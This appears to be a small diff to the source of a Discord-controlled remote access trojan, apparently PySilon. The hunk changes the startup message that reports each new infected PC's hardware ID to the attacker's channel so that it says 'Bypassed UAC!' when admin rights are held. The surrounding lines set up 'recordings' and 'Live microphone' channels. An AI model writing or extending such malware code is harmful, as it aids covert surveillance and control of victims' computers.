@@ -228,7 +228,7 @@ async def on_ready():
             elif channel.name == 'recordings': channel_ids['recordings'] = channel.id
             elif channel.name == 'Live microphone': channel_ids['voice'] = channel.id
 
-    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{' && Bypassed!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
+    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{' && Bypassed UAC!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
 
 # [pysilon_var] !recording_startup 1
     
